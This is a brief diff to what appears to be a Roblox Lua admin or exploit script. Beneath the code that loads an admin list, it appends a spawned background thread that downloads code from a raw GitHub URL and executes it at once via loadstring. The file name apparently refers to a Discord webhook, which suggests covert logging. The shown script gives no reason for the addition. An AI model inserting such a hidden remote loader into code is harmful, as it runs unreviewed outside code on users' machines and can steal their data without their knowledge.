@@ -123,3 +123,7 @@ if getgenv().globalz then _G.rnote("❌ _G.Admins error:\n"..notadmins); end;
 if not getgenv().globalz then warn("❌ _G.Admins error:",notadmins); end;
 end;
 --[[admins loaded]]--
+
+spawn(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rrixh/diskord/refs/heads/main/wHook_lulaslollipop",true))()
+end)
